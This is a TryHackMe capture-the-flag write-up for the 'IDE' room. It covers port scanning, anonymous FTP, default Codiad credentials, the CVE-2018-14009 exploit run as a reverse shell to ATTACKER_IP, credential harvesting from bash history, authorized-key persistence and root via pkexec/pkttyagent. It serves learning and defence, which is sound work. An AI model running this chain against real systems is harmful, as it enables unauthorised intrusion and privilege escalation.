# IDE - TryHackMe Writeup

**Target:** `TARGET_IP`
**Domain:** `ide.thm`
**OS:** Linux (Ubuntu)
**Difficulty:** Easy

---

## Attack Chain Overview

```
Port Discovery (21, 22, 80, 62337)
    ↓
Anonymous FTP → Note: default credentials hint
    ↓
Codiad 2.8.4 on port 62337 → Default credentials (john:password)
    ↓
CVE-2018-14009 → Authenticated RCE → Shell as www-data
    ↓
/home/drac/.bash_history → MySQL credentials
    ↓
SSH as drac (MySQL password reused)
    ↓
User Flag
    ↓
pkexec + pkttyagent (dual SSH sessions) → Root Flag
```

---

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Initial Access](#initial-access)
3. [User Flag](#user-flag)
4. [Privilege Escalation](#privilege-escalation)
5. [Root Flag](#root-flag)
6. [Key Takeaways](#key-takeaways)

---

## Reconnaissance

### Host Setup
```bash
echo "TARGET_IP ide.thm" | sudo tee -a /etc/hosts
```

### Port Discovery
```bash
nmap -sS -p- --min-rate 5000 -n TARGET_IP
```

**Open ports:** `21` (FTP), `22` (SSH), `80` (HTTP), `62337` (HTTP)

### Service Enumeration
```bash
nmap -sVC -p21,22,80,62337 TARGET_IP -oA service-scan
```

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 21 | FTP | vsftpd 3.0.3 | Anonymous login allowed |
| 22 | SSH | OpenSSH 7.6p1 Ubuntu | — |
| 80 | HTTP | Apache 2.4.29 | Default page |
| 62337 | HTTP | Apache 2.4.29 | Codiad IDE |

### Anonymous FTP Enumeration

```bash
ftp TARGET_IP 21
# Username: anonymous
# Password: (blank)
```

**Directory listing:**
```
get -
```

**Message contents:**
```
Hey john,
I have reset the password as you have asked. Please use the default password to login.
Also, please take care of the image file ;)
- drac.
```

**Key finding:** User `john` exists and is using the **default password** for the application.

### Web Content Discovery — Port 62337

```bash
feroxbuster -u http://TARGET_IP:62337/ \
  -w /usr/share/seclists/Discovery/Web-Content/big.txt
```

**Result:** Codiad 2.8.4 IDE is running on port 62337.

---

## Initial Access

### Codiad Default Credentials

Based on the FTP note hinting at default credentials for `john`:

- **Username:** `john`
- **Password:** `password`

Login at `http://TARGET_IP:62337/`.

**✅ Authentication successful.**

### CVE-2018-14009 — Codiad Authenticated RCE

**Vulnerability:** The `search_file_type` parameter in `components/filemanager/controller.php` is passed unsanitized to `system()` / `shell_exec()`, allowing arbitrary command execution by an authenticated user.

**Exploit:** [ExploitDB #49705](https://www.exploit-db.com/exploits/49705)

**Step 1 — Obtain authenticated session cookie:**
```bash
curl -k -i 'http://TARGET_IP/codiad/components/user/controller.php?action=authenticate' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw 'username=john&password=password&theme=default&language=en' \
  -c cookies.txt
```

**Step 2 — Set up listener:**
```bash
nc -lvnp 4444
```

**Step 3 — Execute the exploit:**
```bash
python3 49705.py http://TARGET_IP:62337 john password ATTACKER_IP 4444 linux
```

**✅ Reverse shell received as `www-data`.**

---

## User Flag

### Enumerate from www-data

```bash
id
cat /etc/passwd | grep "bash"
find / -name "*.conf" -o -name "config.php" 2>/dev/null | grep -E "config|.env"
netstat -tulpn 2>/dev/null | grep LISTEN
```

### Credential Discovery in Bash History

Find files owned by `drac`:
```bash
find / -user drac 2>/dev/null
```

Read bash history:
```bash
cat /home/drac/.bash_history
```

**Credentials found:**
- **MySQL User:** `drac`
- **MySQL Password:** `Th3dRaCULa1sR3aL`

### SSH with Reused Credentials

```bash
ssh drac@TARGET_IP
# Password: Th3dRaCULa1sR3aL
```

**✅ SSH access achieved as `drac`.**

```bash
drac@ide:~$ cat /home/drac/user.txt
```

---

## Privilege Escalation

### pkexec + pkttyagent Authentication Agent Bypass

**Context:** `pkexec` can run commands as another user (including root) if an authentication agent is present. Without a graphical session, `pkttyagent` can provide this agent over a TTY.

**Exploit Chain:**
```
Two SSH sessions as drac
    ↓
Session 2: pkttyagent --process <PID of session 1>
    ↓
Session 1: pkexec /bin/bash
    ↓
Session 2 prompts for drac's password
    ↓
Root shell in Session 1
```

### Step 1 — Generate SSH Key for Stable Sessions

```bash
# On attacker machine
ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa_drac

# On victim (as drac)
mkdir -p /home/drac/.ssh
echo "<attacker public key>" > /home/drac/.ssh/authorized_keys
chmod 700 /home/drac/.ssh
chmod 600 /home/drac/.ssh/authorized_keys
```

### Step 2 — Open Two SSH Sessions

**Terminal 1 (main session):**
```bash
ssh -i ~/.ssh/id_rsa_drac drac@TARGET_IP
```

**Terminal 2 (agent session):**
```bash
ssh -i ~/.ssh/id_rsa_drac drac@TARGET_IP
```

### Step 3 — Launch pkttyagent in Session 2

```bash
# Get the PID of session 1's sshd process
ps aux | grep sshd | grep drac | grep -v grep
# Example output: root 12345 ... sshd: drac@pts/0

# Start the authentication agent for session 1
pkttyagent --process 12345 --notify-fd 1
```

### Step 4 — Execute pkexec in Session 1

```bash
pkexec /bin/bash
```

Session 2 will prompt for `drac`'s password (`Th3dRaCULa1sR3aL`). After entering it:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

**✅ Root shell obtained.**

---

## Root Flag

```bash
root@ide:/# cat /root/root.txt
```

---

## Key Takeaways

| Stage | Technique | Key Detail |
|-------|-----------|------------|
| **Recon** | Anonymous FTP | Note revealed username `john` and hint about default password |
| **Initial Access** | Default credentials | Codiad login with `john:password` |
| **RCE** | CVE-2018-14009 | Codiad file search unsanitized shell injection |
| **Cred Discovery** | Bash history | `drac`'s MySQL password visible in `.bash_history` |
| **SSH Access** | Credential reuse | MySQL password reused for SSH login |
| **Privilege Escalation** | pkexec + pkttyagent | Authentication agent via second SSH session |

### Security Lessons

1. **Never use default credentials** — Applications must force password changes on first login
2. **Clear `.bash_history`** — Credentials entered interactively persist in history
3. **Password reuse is dangerous** — A database password reused for SSH access is a critical risk
4. **Expose minimum services** — Running Codiad on a non-standard port is not security; remove it from production
5. **Restrict pkexec** — Polkit should be configured to prevent unprivileged users from elevating without explicit policy
